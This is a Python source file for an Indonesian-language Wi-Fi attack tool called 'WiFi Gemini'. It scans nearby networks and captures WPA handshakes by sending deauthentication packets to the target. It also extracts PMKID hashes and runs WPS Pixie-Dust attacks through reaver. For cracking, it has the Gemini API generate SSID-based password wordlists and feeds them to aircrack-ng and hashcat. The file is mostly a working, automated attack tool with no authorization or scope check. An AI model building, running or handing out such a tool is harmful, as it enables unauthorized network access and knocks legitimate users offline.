import subprocess
import re
import requests
import json
import time
import os
import sys
import csv
import configparser
from halo import Halo
from colorama import Fore, Style, init
from pyfiglet import Figlet

# Inisialisasi Colorama
init(autoreset=True)

class UI:
    def __init__(self): self.spinner = Halo(text_color='cyan'); self.spinner_active = False
    def banner(self, text="WiFi Gemini"): f = Figlet(font='slant'); print(Fore.CYAN + f.renderText(text)); print(Fore.YELLOW + " v4.4 - Session Management Fix"); print("-" * 60)
    def info(self, text): print(f"{Fore.YELLOW}[*] {text}")
    def success(self, text): print(f"{Fore.GREEN}[+] {text}")
    def error(self, text): print(f"{Fore.RED}[!] {text}")
    def prompt(self, text): return input(f"{Fore.CYAN}[?] {text}")
    def header(self, text): print(f"\n{Style.BRIGHT}{Fore.CYAN}{'='*60}\n 🤖 {text.upper()}\n{'='*60}{Style.RESET_ALL}")
    def table(self, networks_with_wps_status):
        print(f"\n  {Fore.WHITE+Style.BRIGHT}{'No.':<5}{'SSID':<30}{'BSSID':<20}{'Channel':<10}{'WPS Active'}{Style.RESET_ALL}"); print(f"  {'-'*5}{'-'*30}{'-'*20}{'-'*10}{'-'*12}")
        for i, (net_info, wps_enabled) in enumerate(networks_with_wps_status):
            ssid, bssid, channel = net_info; color = Fore.GREEN if wps_enabled else Fore.RED; wps_text = "Yes" if wps_enabled else "No"
            print(color + f"  {i+1:<5}{ssid:<30}{bssid:<20}{channel:<10}{wps_text}"); print(Style.RESET_ALL)
    def start_spinner(self, text="Memproses..."): self.spinner.text = text; self.spinner_active = True; self.spinner.start()
    def stop_spinner(self, success=True, new_text="Selesai."):
        if self.spinner_active:
            if success: self.spinner.succeed(new_text)
            else: self.spinner.fail(new_text)
            self.spinner_active = False
    def display_main_menu(self):
        self.header("PILIH JENIS SERANGAN")
        print(f" {Fore.CYAN}1.{Style.RESET_ALL} Serangan WPA Handshake (Klasik, Paling Kompatibel)")
        print(f" {Fore.CYAN}2.{Style.RESET_ALL} Serangan PMKID (Modern, Metode Airodump)")
        print(f" {Fore.GREEN+Style.BRIGHT}3.{Style.RESET_ALL} Serangan WPS Pixie-Dust (Sangat Efektif Jika Target Rentan)")
        return self.prompt("Masukkan pilihan Anda (1-3): ")

def load_config():
    config = configparser.ConfigParser();
    if not os.path.exists('config.ini'): UI().error("File 'config.ini' tidak ditemukan!"); sys.exit(1)
    config.read('config.ini'); return config

ui = UI(); config = load_config()

try:
    GEMINI_API_KEY = os.getenv('GEMINI_API_KEY') 
    INTERFACE = config.get('Interfaces', 'main_interface', fallback='wlp3s0')
    MONITOR_INTERFACE = f'{INTERFACE}mon'
    WORDLIST_DIR = config.get('Paths', 'wordlist_dir', fallback='.')
    GENERATED_WORDLIST_FILE = config.get('Filenames', 'gemini_wordlist', fallback='gemini_wordlist.txt')
    HASHCAT_HASH_FILE = config.get('Filenames', 'hashcat_hash', fallback='hash.hc22000')
    HASHCAT_RULE_FILE = config.get('Paths', 'hashcat_rule_file', fallback='/usr/share/hashcat/rules/d3ad0ne.rule')
    PMKID_CAPTURE_FILE = config.get('Filenames', 'pmkid_capture', fallback='pmkid_capture.pcapng')
    PMKID_FILTER_FILE = config.get('Filenames', 'pmkid_filter', fallback='pmkid_filter.txt')
    CAPTURE_FILE_PREFIX = config.get('Filenames', 'handshake_capture', fallback='handshake')
    REPORT_FILE = config.get('Paths', 'report_file', fallback='report.txt')
    HASHCAT_POTFILE = config.get('Filenames', 'hashcat_potfile', fallback='cracked.pot')
    GEMINI_MODEL = config.get('AI', 'gemini_model', fallback='gemini-1.5-flash-latest')
    SESSION_FILE = 'sessions.json'
except (configparser.NoSectionError, configparser.NoOptionError) as e:
    ui.error(f"Error pada 'config.ini': {e}"); sys.exit(1)

# ======================================================================
# FUNGSI MANAJEMEN SESI YANG HILANG (SEKARANG DITAMBAHKAN)
# ======================================================================
def load_sessions():
    """Memuat sesi yang tersimpan dari sessions.json."""
    if os.path.exists(SESSION_FILE):
        try:
            with open(SESSION_FILE, 'r') as f:
                return json.load(f)
        except json.JSONDecodeError:
            return {} # Kembalikan dict kosong jika file rusak
    return {}

def save_session(session_data):
    """Menyimpan data sesi ke sessions.json."""
    sessions = load_sessions()
    sessions[session_data['bssid']] = session_data
    with open(SESSION_FILE, 'w') as f:
        json.dump(sessions, f, indent=4)
    ui.success(f"Sesi untuk target {session_data['ssid']} telah disimpan.")

def clear_session(bssid):
    """Menghapus sesi yang sudah selesai dari sessions.json."""
    sessions = load_sessions()
    if bssid in sessions:
        del sessions[bssid]
        with open(SESSION_FILE, 'w') as f:
            json.dump(sessions, f, indent=4)
        ui.info(f"Sesi untuk {bssid} telah dibersihkan.")

# --- Sisa Fungsi ---

def run_command(command, timeout=None, stream_output=False):
    if stream_output:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, encoding='utf-8', errors='ignore')
        stdout_lines = []
        for line in iter(process.stdout.readline, ''): print(line.strip()); stdout_lines.append(line)
        process.stdout.close(); return_code = process.wait()
        return ("\n".join(stdout_lines), None if return_code == 0 else "Proses selesai dengan error")
    try:
        result = subprocess.run(command, check=True, capture_output=True, text=True, encoding='utf-8', errors='ignore', timeout=timeout)
        return (result.stdout, result.stderr)
    except subprocess.CalledProcessError as e: return (e.stdout, e.stderr)
    except (FileNotFoundError, subprocess.TimeoutExpired) as e: return (None, str(e))
def check_root():
    if os.geteuid() != 0: ui.error("Perlu hak akses root."); sys.exit(1)
def enable_monitor_mode(aggressive=False):
    global MONITOR_INTERFACE
    ui.info(f"Mengaktifkan monitor mode pada {INTERFACE}...")
    if aggressive:
        ui.info("Menggunakan metode agresif (mematikan proses lain)...")
        run_command(['airmon-ng', 'check', 'kill'])
        _, err = run_command(['airmon-ng', 'start', INTERFACE])
        if not err: MONITOR_INTERFACE = f'{INTERFACE}mon'; ui.success(f"Mode monitor aktif di {MONITOR_INTERFACE}."); return True
        else: ui.error("Metode agresif gagal."); return False
    else:
        ui.info("Menggunakan metode standar (menjaga koneksi lain tetap aktif)...")
        try:
            run_command(['ip', 'link', 'set', INTERFACE, 'down']); run_command(['iwconfig', INTERFACE, 'mode', 'monitor']); run_command(['ip', 'link', 'set', INTERFACE, 'up']); time.sleep(1)
            check, _ = run_command(['iwconfig', INTERFACE])
            if check and 'Mode:Monitor' in check: MONITOR_INTERFACE = INTERFACE; ui.success(f"Mode monitor aktif di {MONITOR_INTERFACE}."); return True
            raise RuntimeError("Gagal verifikasi mode monitor.")
        except Exception: ui.error("Metode standar gagal."); return False
def disable_monitor_mode():
    ui.info(f"Menonaktifkan monitor mode di {MONITOR_INTERFACE}...");
    try:
        run_command(['airmon-ng', 'stop', MONITOR_INTERFACE])
        ui.info("Merestart NetworkManager..."); run_command(['systemctl', 'start', 'NetworkManager.service']); ui.success("Layanan jaringan dipulihkan.")
    except Exception as e: ui.error(f"Gagal menonaktifkan mode monitor: {e}")
def scan_networks():
    ui.start_spinner("Memindai jaringan (airodump-ng)..."); scan_prefix = "scan_result"
    for f in os.listdir('.'):
        if f.startswith(scan_prefix): os.remove(f)
    p = subprocess.Popen(['airodump-ng', '--write', scan_prefix, '--output-format', 'csv', MONITOR_INTERFACE], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(15); p.terminate(); p.wait()
    ui.stop_spinner(success=True, new_text="Pemindaian airodump-ng Selesai.")
    networks = [];
    try:
        with open(f"{scan_prefix}-01.csv", 'r') as f:
            rows = csv.reader(f); next(r for r in rows if r and r[0].strip() == 'BSSID')
            for r in rows:
                if not r or len(r) < 14 or r[0].strip() == 'Station MAC': break
                b, c, e = r[0].strip(), r[3].strip(), r[13].strip()
                if e and b: networks.append((e, b, c))
    except: pass
    finally:
        for f in os.listdir('.'):
            if f.startswith(scan_prefix): os.remove(f)
    ui.start_spinner("Memindai jaringan dengan WPS aktif (wash)..."); wps_networks = set()
    wash_cmd = ['wash', '-i', MONITOR_INTERFACE, '-C', '-s']; wash_output, _ = run_command(wash_cmd, timeout=15)
    ui.stop_spinner(success=True, new_text="Pemindaian WPS Selesai.")
    if wash_output:
        for line in wash_output.split('\n'):
            match = re.search(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', line)
            if match: wps_networks.add(match.group(0))
    if not networks: ui.error("Tidak ada jaringan yang terdeteksi."); return []
    ui.success("Hasil Pemindaian Gabungan:"); unique_networks = sorted(list(set(networks))); networks_with_wps = []
    for net in unique_networks:
        bssid = net[1]; wps_enabled = bssid in wps_networks
        networks_with_wps.append((net, wps_enabled))
    ui.table(networks_with_wps); return unique_networks
def select_target(networks):
    if not networks: return None
    try: sys.stdin = open('/dev/tty')
    except: return None
    while True:
        try:
            choice_str = ui.prompt("Pilih target (nomor): ").strip()
            if not choice_str: continue
            choice = int(choice_str) - 1
            if 0 <= choice < len(networks): return networks[choice]
            else: ui.error("Pilihan tidak valid.")
        except (ValueError, EOFError, KeyboardInterrupt): ui.error("\nInput dibatalkan."); return None
def generate_gemini_wordlist(target_info):
    ui.header("Menghubungi Gemini AI untuk Membuat Wordlist Khusus");
    if not GEMINI_API_KEY: ui.error("Kunci API Gemini tidak ditemukan."); return None
    ssid_name = target_info[0]; prompt = f"""Anda adalah generator wordlist. HANYA berikan daftar kata, satu kata per baris. JANGAN tambahkan penjelasan. SSID Target: "{ssid_name}". Buat daftar berisi sekitar 100 calon password berdasarkan SSID tersebut, termasuk variasi angka, huruf besar/kecil, dan simbol. Sekarang, buatkan wordlist untuk SSID "{ssid_name}":""";
    headers = {'Content-Type': 'application/json'}; data = {"contents": [{"parts":[{"text": prompt}]}]}; api_url = f"https://generativelanguage.googleapis.com/v1beta/models/{GEMINI_MODEL}:generateContent?key={GEMINI_API_KEY}";
    ui.start_spinner(f"Meminta wordlist untuk SSID '{ssid_name}'...")
    try:
        response = requests.post(api_url, headers=headers, data=json.dumps(data), timeout=45); response.raise_for_status()
        raw_text = response.json()['candidates'][0]['content']['parts'][0]['text']; passwords = [line.strip() for line in raw_text.strip().split('\n') if line.strip()]
        if not passwords: ui.stop_spinner(success=False, new_text="Gemini tidak menghasilkan wordlist."); return None
        with open(GENERATED_WORDLIST_FILE, 'w') as f: f.write('\n'.join(passwords))
        file_path = os.path.abspath(GENERATED_WORDLIST_FILE); ui.stop_spinner(success=True, new_text=f"Gemini membuat wordlist dengan {len(passwords)} kata."); ui.info(f"Disimpan di: {file_path}"); return file_path
    except Exception as e: ui.stop_spinner(success=False, new_text=f"Gagal berkomunikasi dengan Gemini: {e}"); return None
def convert_cap_to_hashcat(cap_file):
    ui.info(f"Mengonversi {cap_file} ke format hashcat..."); _, err = run_command(['which', 'hcxpcapngtool'])
    if err: ui.error("hcxpcapngtool tidak ditemukan."); return None
    hash_file = os.path.abspath(HASHCAT_HASH_FILE); _, conversion_error = run_command(['hcxpcapngtool', '-o', hash_file, cap_file])
    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0: ui.success(f"Konversi berhasil."); return hash_file
    else:
        ui.error("Gagal mengonversi file .cap.")
        if conversion_error: ui.error(f"   Detail Error: {conversion_error.strip()}")
        else: ui.error("   File .cap mungkin tidak berisi handshake/pmkid yang dapat diproses.")
        return None
def crack_with_aircrack(target_info, capture_file, wordlist_path):
    session_data = {"ssid": target_info[0], "bssid": target_info[1], "type": "aircrack", "capture_file": capture_file, "wordlist": wordlist_path}
    ui.header(f"MENYERANG DENGAN AIRCRACK (WORDLIST: {os.path.basename(wordlist_path)})");
    if not os.path.exists(wordlist_path): ui.error(f"Wordlist tidak ditemukan: {wordlist_path}"); return f"Gagal: wordlist tidak ditemukan."
    cmd = ['aircrack-ng', '-w', wordlist_path, capture_file]
    ui.info("Untuk menyimpan sesi dan berhenti, tekan Ctrl+C...")
    try:
        ui.start_spinner("Menjalankan aircrack-ng...")
        result, _ = run_command(cmd)
        ui.stop_spinner(True, "Proses Aircrack Selesai.")
        return result if result else "Proses aircrack-ng gagal."
    except KeyboardInterrupt:
        ui.stop_spinner(False, "Serangan Aircrack dihentikan oleh pengguna.")
        choice = ui.prompt("Simpan sesi cracking ini untuk dilanjutkan nanti? (y/n): ").lower()
        if choice == 'y': save_session(session_data)
        return "Serangan dihentikan oleh pengguna."
def crack_with_hashcat(target_info, hash_file, wordlist_path):
    session_name = f"{target_info[0].replace(' ', '')}_{target_info[1].replace(':', '')}"
    session_data = {"ssid": target_info[0], "bssid": target_info[1], "type": "hashcat", "hash_file": hash_file, "wordlist": wordlist_path, "session_name": session_name}
    ui.header(f"MENYERANG DENGAN HASHCAT + ATURAN (SESI: {session_name})");
    if not run_command(['which', 'hashcat'])[0]: ui.error("hashcat tidak ditemukan."); return "Gagal."
    if not os.path.exists(HASHCAT_RULE_FILE): ui.error(f"File aturan tidak ditemukan: {HASHCAT_RULE_FILE}"); return "Gagal."
    cmd = ['hashcat', '-m', '22000', '-a', '0', '--potfile-path', HASHCAT_POTFILE, f'--session={session_name}', hash_file, wordlist_path, '-r', HASHCAT_RULE_FILE]
    ui.info("Untuk menyimpan sesi dan berhenti, tekan Ctrl+C...")
    try:
        ui.start_spinner("Menjalankan hashcat (bisa lama)..."); run_command(cmd)
        ui.stop_spinner(True, "Proses Hashcat Selesai.")
    except KeyboardInterrupt:
        ui.stop_spinner(False, "Serangan Hashcat dihentikan oleh pengguna.")
        choice = ui.prompt("Simpan sesi cracking ini untuk dilanjutkan nanti? (y/n): ").lower()
        if choice == 'y': save_session(session_data)
        return "Serangan dihentikan oleh pengguna."
    ui.info("Memeriksa hasil dari hashcat..."); result, _ = run_command(['hashcat', '-m', '22000', '--show', f'--session={session_name}', hash_file])
    if result and ":" in result: return f"KEY FOUND! (Hashcat)\n{result}"
    return "Password tidak ditemukan dengan metode Hashcat + Aturan."
def generate_report(target_info, results):
    ui.header("MEMBUAT LAPORAN AKHIR")
    try:
        with open(REPORT_FILE, 'w') as f:
            f.write("=== Laporan Pengujian Keamanan Wi-Fi (WiFi Gemini) ===\n\n"); f.write(f"Tanggal: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"SSID: {target_info[0]}\nBSSID: {target_info[1]}\nChannel: {target_info[2]}\n\n")
            for i, (method, result) in enumerate(results): f.write(f"=== Hasil Serangan {i+1}: {method} ===\n"); f.write(result + "\n\n")
        ui.success(f"Laporan berhasil disimpan di {os.path.abspath(REPORT_FILE)}")
    except IOError as e: ui.error(f"Gagal menulis laporan: {e}")
def capture_handshake(bssid, channel):
    ui.info(f"Menargetkan {bssid} di channel {channel}..."); test_out, _ = run_command(['aireplay-ng', '--test', MONITOR_INTERFACE], timeout=20)
    if not test_out: ui.error("Tes injeksi gagal."); return None
    ui.success("Tes injeksi berhasil. Memulai penangkapan handshake...")
    prefix = os.path.abspath(CAPTURE_FILE_PREFIX)
    for f in os.listdir('.'):
        if f.startswith(CAPTURE_FILE_PREFIX) or f.startswith(HASHCAT_HASH_FILE): os.remove(f)
    cmd = ['airodump-ng', '-c', channel, '--bssid', bssid, '-w', prefix, MONITOR_INTERFACE]
    try:
        p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ui.start_spinner("Mengirim deauth & menunggu handshake...")
        timeout = 60; start = time.time()
        while time.time() - start < timeout:
            subprocess.Popen(['aireplay-ng', '--deauth', '5', '-a', bssid, MONITOR_INTERFACE], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); time.sleep(10)
            h_file = f"{prefix}-01.cap"
            if os.path.exists(h_file):
                res, _ = run_command(['aircrack-ng', h_file])
                if res and "1 handshake" in res: ui.stop_spinner(success=True, new_text="WPA Handshake Berhasil Ditangkap!"); p.terminate(); return h_file
        ui.stop_spinner(success=False, new_text="Waktu habis."); p.terminate(); return None
    except KeyboardInterrupt: ui.stop_spinner(success=False, new_text="\nProses dibatalkan."); return None
    finally: subprocess.run(['pkill', '-f', 'airodump-ng'], check=False)
def run_handshake_attack(target):
    all_results = []; handshake_file = capture_handshake(target[1], target[2])
    if not handshake_file: return
    hashcat_file = convert_cap_to_hashcat(handshake_file)
    gemini_wordlist_path = generate_gemini_wordlist(target)
    if gemini_wordlist_path:
        result_tier1 = crack_with_aircrack(target, handshake_file, gemini_wordlist_path)
        all_results.append(("Aircrack + Gemini Wordlist", result_tier1));
        if "KEY FOUND!" in result_tier1: ui.success("Password ditemukan pada Tingkat 1!"); generate_report(target, all_results); clear_session(target[1]); return
    if gemini_wordlist_path and hashcat_file:
        choice = ui.prompt("Tingkat 1 gagal. Coba serangan canggih (Hashcat + Aturan)? (y/n): ").lower()
        if choice == 'y':
            result_tier2 = crack_with_hashcat(target, hashcat_file, gemini_wordlist_path)
            all_results.append(("Hashcat + Gemini Wordlist + Aturan", result_tier2))
            if "KEY FOUND!" in result_tier2: ui.success("Password ditemukan pada Tingkat 2!"); generate_report(target, all_results); clear_session(target[1]); return
    if gemini_wordlist_path and os.path.exists(gemini_wordlist_path): os.remove(gemini_wordlist_path)
    choice = ui.prompt("Tingkat sebelumnya gagal. Coba serangan terakhir (rockyou.txt)? (y/n): ").lower()
    if choice == 'y':
        standard_wordlist = os.path.join(WORDLIST_DIR, 'rockyou.txt'); result_tier3 = crack_with_aircrack(target, handshake_file, standard_wordlist)
        all_results.append(("Aircrack + rockyou.txt", result_tier3))
        if "KEY FOUND!" in result_tier3: clear_session(target[1])
    generate_report(target, all_results)
def run_pmkid_attack(target):
    ui.header(f"MEMULAI SERANGAN PMKID PADA {target[0]}"); _, err = run_command(['which', 'hcxdumptool'])
    if err: ui.error("hcxdumptool tidak ditemukan."); return
    capture_file = os.path.abspath(PMKID_CAPTURE_FILE); cmd = ['airodump-ng', '--bssid', target[1], '-c', target[2], '-w', capture_file, MONITOR_INTERFACE]
    ui.start_spinner(f"Menangkap paket dari {target[1]} untuk mencari PMKID (30 detik)...")
    p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); time.sleep(30); p.terminate(); p.wait()
    ui.stop_spinner(success=True, new_text="Penangkapan paket selesai.")
    capture_file_with_ext = f"{capture_file}-01.cap"
    if not os.path.exists(capture_file_with_ext): ui.error("Gagal menangkap paket."); return
    hashcat_file = convert_cap_to_hashcat(capture_file_with_ext)
    if not hashcat_file: ui.error("Tidak ada PMKID yang berhasil diekstrak."); return
    ui.success("PMKID Hash berhasil diekstrak! Siap untuk dipecahkan dengan Hashcat.")
    all_results = []; gemini_wordlist_path = generate_gemini_wordlist(target)
    if gemini_wordlist_path:
        result_pmkid = crack_with_hashcat(target, hashcat_file, gemini_wordlist_path)
        all_results.append(("Hashcat + Gemini Wordlist (PMKID)", result_pmkid))
        if "KEY FOUND!" in result_pmkid: ui.success("Password ditemukan dengan serangan PMKID!"); generate_report(target, all_results); clear_session(target[1]); return
    ui.error("Gagal menemukan password dengan wordlist Gemini."); generate_report(target, all_results)
def run_wps_attack(target):
    ui.header(f"MEMULAI SERANGAN WPS PIXIE-DUST PADA {target[0]}"); _, err = run_command(['which', 'reaver'])
    if err: ui.error("reaver tidak ditemukan."); return
    bssid = target[1]; channel = target[2]; ui.info("Serangan WPS membutuhkan waktu beberapa menit. Mohon bersabar."); ui.info("Output dari reaver akan ditampilkan langsung di bawah ini:")
    cmd = ['reaver', '-i', MONITOR_INTERFACE, '-b', bssid, '-c', channel, '-K', '1', '-vvv', '--fail-wait=360']
    reaver_result, _ = run_command(cmd, stream_output=True)
    if "WPA PSK" in reaver_result and "WPS PIN" in reaver_result:
        ui.success("Serangan WPS Berhasil!"); generate_report(target, [("WPS Pixie-Dust", reaver_result)])
    else:
        ui.error("Serangan WPS gagal."); generate_report(target, [("WPS Pixie-Dust", "Serangan GAGAL. Target tidak rentan.")])

def resume_attack(session_data):
    """Melanjutkan serangan dari sesi yang tersimpan."""
    ui.header(f"MELANJUTKAN SESI UNTUK '{session_data['ssid']}'")
    target_info = (session_data['ssid'], session_data['bssid'], None)
    
    if session_data['type'] == 'aircrack':
        return crack_with_aircrack(
            target_info, 
            session_data['capture_file'], 
            session_data['wordlist']
        )
    elif session_data['type'] == 'hashcat':
        session_name = session_data['session_name']
        cmd = ['hashcat', f'--session={session_name}', '--restore']
        ui.info(f"Melanjutkan sesi hashcat '{session_name}'...")
        try:
            ui.start_spinner("Menjalankan hashcat restore...")
            run_command(cmd)
            ui.stop_spinner(True, "Proses Hashcat Selesai.")
        except KeyboardInterrupt:
            ui.stop_spinner(False, "Sesi restore dihentikan.")
            return "Sesi restore dihentikan."
        
        ui.info("Memeriksa hasil dari hashcat...")
        result, _ = run_command(['hashcat', '-m', '22000', '--show', f'--session={session_name}', session_data['hash_file']])
        if result and ":" in result: return f"KEY FOUND! (Hashcat)\n{result}"
        return "Password tidak ditemukan setelah melanjutkan sesi."

def main():
    ui.banner(); check_root()
    
    saved_sessions = load_sessions()
    if saved_sessions:
        ui.header("SESI TERSIMPAN DITEMUKAN")
        bssid, session_data = next(iter(saved_sessions.items()))
        ui.info(f"Target: {session_data['ssid']} ({bssid})")
        choice = ui.prompt("Lanjutkan sesi ini? (y/n): ").lower()
        if choice == 'y':
            is_aggressive = (session_data.get('type') != 'aircrack')
            monitor_mode_activated = enable_monitor_mode(aggressive=is_aggressive)
            if monitor_mode_activated:
                result = resume_attack(session_data)
                if result and "KEY FOUND!" in result:
                    ui.success("Password ditemukan setelah melanjutkan sesi!")
                    clear_session(bssid); generate_report((session_data['ssid'], bssid, None), [("Resume Session", result)])
                else: ui.error("Password masih belum ditemukan.")
                disable_monitor_mode()
            return

    monitor_mode_activated = False
    try:
        attack_choice = ui.display_main_menu()
        is_aggressive_mode = (attack_choice in ['2', '3'])
        monitor_mode_activated = enable_monitor_mode(aggressive=is_aggressive_mode)
        if not monitor_mode_activated: sys.exit(1)
        if attack_choice in ['1', '2', '3']:
            networks = scan_networks()
            if not networks: ui.error("Tidak ada jaringan yang terdeteksi."); return
            target = select_target(networks)
            if not target: return
            if attack_choice == '1': run_handshake_attack(target)
            elif attack_choice == '2': run_pmkid_attack(target)
            elif attack_choice == '3':
                ui.info(f"Memverifikasi status WPS untuk {target[0]}..."); wash_output, _ = run_command(['wash', '-i', MONITOR_INTERFACE, '-C'], timeout=10)
                if not wash_output or target[1] not in wash_output: ui.error("Target tidak terdeteksi memiliki WPS aktif."); return
                run_wps_attack(target)
        else: ui.error("Pilihan tidak valid.")
    finally:
        ui.stop_spinner(success=True, new_text="Proses selesai.")
        if monitor_mode_activated: disable_monitor_mode()
        ui.info("Membersihkan file sementara...")
        active_sessions = load_sessions()
        files_in_session = []
        for session in active_sessions.values():
            files_in_session.extend([session.get('capture_file'), session.get('hash_file')])
        
        files_to_delete = [GENERATED_WORDLIST_FILE, HASHCAT_HASH_FILE, HASHCAT_POTFILE, PMKID_CAPTURE_FILE, PMKID_FILTER_FILE, CAPTURE_FILE_PREFIX+"-01.cap"]
        for f in files_to_delete:
            if f and os.path.exists(f) and f not in files_in_session:
                os.remove(f)

if __name__ == "__main__":
    main()